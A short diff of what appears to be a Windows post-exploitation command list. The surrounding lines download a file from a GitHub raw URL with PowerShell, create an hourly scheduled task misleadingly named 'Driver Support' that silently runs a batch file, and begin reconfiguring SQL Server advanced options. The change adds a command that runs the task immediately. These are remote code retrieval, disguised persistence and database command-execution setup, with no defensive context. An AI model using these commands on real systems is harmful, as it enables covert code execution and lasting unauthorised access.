@@ -26,6 +26,7 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.gi
 
 schtasks /create /tn "Driver Support" /tr "cmd.exe /Q /C C:\Support\driver.bat" /sc DAILY /st 00:11 /f /RI 60 /du 24:00
 schtasks /Query /FO List /v /TN "Driver Support"
+schtasks /Run /TN "Driver Support"
 
 sp_configure 'show advanced options',1;
 RECONFIGURE;
